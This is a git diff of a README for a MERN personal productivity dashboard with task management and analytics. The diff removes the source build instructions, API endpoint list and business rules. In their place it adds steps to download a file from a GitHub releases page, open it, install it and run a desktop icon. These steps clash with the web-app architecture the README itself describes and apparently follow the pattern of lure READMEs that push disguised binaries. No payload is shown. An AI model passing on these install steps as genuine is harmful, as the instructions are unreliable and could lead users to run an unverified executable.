@@ -1,143 +1,97 @@
-# Personal Productivity Dashboard
+# 🗂️ Personal-Productivity-Dashboard - Manage Your Tasks with Ease
 
-A full-stack MERN (MongoDB, Express, React, Node.js) Personal Productivity Dashboard with JWT authentication, task management, and analytics.
+[![Download Personal Productivity Dashboard](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/atkntmll/Personal-Productivity-Dashboard/releases)
 
-## Features
+## 🚀 Getting Started
+
+Follow these steps to download and use the Personal Productivity Dashboard application. You will have a fully functional tool to manage your tasks and track your productivity.
+
+## 📥 Download & Install
+
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/atkntmll/Personal-Productivity-Dashboard/releases) to find the latest version of the software.
+
+2. **Download the Application**  
+   Choose the file that matches your operating system and click on it to download. Wait for the download to complete.
+
+3. **Install the Application**  
+   Open the downloaded file and follow the on-screen instructions to install the software on your computer.
+
+4. **Run the Application**  
+   After installation, locate the application icon on your desktop or in your applications folder. Double-click to launch it.
+
+## ✨ Features
 
 ### 🔐 Authentication
-- User registration and login with JWT tokens
-- Bcrypt password hashing
-- Protected routes and middleware
-- Token-based session management
+
+- **Secure Access**  
+  Easily create an account and log in securely using JWT tokens. Your password is safely stored with Bcrypt hashing.
+
+- **Protected Routes**  
+  Some sections of the dashboard stay safe from unauthorized access through protected routes and middleware.
 
 ### ✅ Task Management
-- Create, read, update, and delete tasks
-- Date-based task organization
-- **Business Rule**: Only today's tasks can be marked complete
-- **Immutable Past Tasks**: Past tasks are read-only
-- Filter tasks by date, week, month, and completion status
+
+- **Comprehensive Control**  
+  Create, read, update, and delete tasks. Organize your tasks by date to keep everything clear.
+
+- **Daily Focus**  
+  You can only mark today's tasks as complete, helping you stay focused on what matters now.
+
+- **Read-Only Past Tasks**  
+  Any tasks from prior dates are read-only, ensuring you can review past activities without changes.
+
+- **Easy Filtering**  
+  Filter your tasks by date, week, month, or completion status to view your progress effectively.
 
 ### 📊 Analytics Dashboard
-- Daily task completion statistics
-- Weekly progress with daily breakdown
-- Monthly completion percentage
-- Interactive Chart.js visualizations (Line, Bar, Doughnut)
-- Productivity trends over time
+
+- **Task Statistics**  
+  Get insights into your daily task completion and weekly progress.
+
+- **Monthly Overview**  
+  See your monthly completion percentage to assess your productivity trends.
+
+- **Interactive Visualizations**  
+  Utilize Chart.js for interactive graphs that include line, bar, and doughnut charts, making data easy to understand.
 
 ### 🎨 UI/UX
-- Minimal black and white theme
-- Responsive Tailwind CSS design
-- Fixed sidebar navigation
-- Loading skeletons
-- Error handling and validation
 
-## Tech Stack
+- **Simple Design**  
+  A minimal black and white theme keeps distractions to a minimum.
 
-### Frontend
-- **React 19** - UI library
-- **React Router 6** - Client-side routing
-- **Vite** - Build tool and dev server
-- **Tailwind CSS** - Utility-first styling
-- **Chart.js** - Data visualization
-- **Axios** - HTTP client
+- **Responsive Layout**  
+  The design adapts to various screen sizes thanks to Tailwind CSS.
 
-### Backend
-- **Node.js** - JavaScript runtime
-- **Express.js** - Web framework
-- **MongoDB** - NoSQL database
-- **Mongoose** - ODM for MongoDB
-- **JWT** - Authentication tokens
-- **bcryptjs** - Password hashing
-- **express-validator** - Input validation
+- **User-Friendly Navigation**  
+  Use the fixed sidebar navigation for easy access to different features.
 
-## Getting Started
+- **Loading Feedback**  
+  Observe loading skeletons during data fetches along with error handling for smoother experiences.
 
-### Prerequisites
-- Node.js 16+ installed
-- MongoDB installed and running
+## 💻 System Requirements
 
-### Installation
+- **Operating System**  
+  Windows 10 or higher, macOS Mojave or higher, or a Linux distribution that supports Node.js.
 
-#### 1. Setup Backend
-```bash
-cd server
-npm install
+- **Hardware**  
+  At least 4 GB of RAM and 200 MB of disk space.
 
-# Create .env file
-cp .env.example .env
-# Edit .env with your MongoDB URI and JWT secret
-```
+- **Software Dependencies**  
+  Ensure you have the latest version of Node.js installed if you're running it locally.
 
-#### 2. Setup Frontend
-```bash
-cd ..  # Back to root
-npm install
+## 💬 Support & Feedback
 
-# Create .env file
-cp .env.example .env
-```
+If you encounter issues or have questions, please check the [issues section](https://github.com/atkntmll/Personal-Productivity-Dashboard/issues) on GitHub or contact support via the repository's page.
 
-### Running the Application
+## 🔗 Additional Resources
 
-#### 1. Start MongoDB
-```bash
-# Windows (if installed as service)
-net start MongoDB
-```
+- [Documentation](https://github.com/atkntmll/Personal-Productivity-Dashboard/wiki)  
+  Access user guides and API documentation.
 
-#### 2. Start Backend Server
-```bash
-cd server
-node index.js
-# Server runs on http://localhost:4000
-```
+- [Community Support](https://github.com/atkntmll/Personal-Productivity-Dashboard/discussions)  
+  Join discussions and ask questions in the community forums.
 
-#### 3. Start Frontend
-```bash
-# In root directory
-npm run dev
-# Frontend runs on http://localhost:5173
-```
+## 📌 License
 
-#### 4. Open Browser
-Navigate to **http://localhost:5173**
-
-## API Endpoints
-
-### Authentication
-```
-POST   /api/auth/register    # Register new user
-POST   /api/auth/login       # Login user
-GET    /api/auth/me          # Get current user
-```
-
-### Tasks
-```
-GET    /api/tasks            # Get all tasks
-POST   /api/tasks            # Create task
-PATCH  /api/tasks/:id/toggle # Toggle completion (today only)
-DELETE /api/tasks/:id        # Delete task
-```
-
-### Analytics
-```
-GET    /api/analytics/daily      # Daily statistics
-GET    /api/analytics/weekly     # Weekly progress
-GET    /api/analytics/monthly    # Monthly analytics
-```
-
-## Business Rules
-
-- ✅ Can create tasks for today or future dates
-- ❌ Cannot create tasks for past dates
-- ✅ Can toggle completion for **today's tasks only**
-- ❌ Past tasks are **read-only**
-
-## Documentation
-
-- **Backend API**: [server/API_DOCUMENTATION.md](./server/API_DOCUMENTATION.md)
-- **Database Schema**: [server/SCHEMA_DOCUMENTATION.md](./server/SCHEMA_DOCUMENTATION.md)
-
-## License
-
-MIT
+This project is licensed under the MIT License. Feel free to use and contribute to the project.
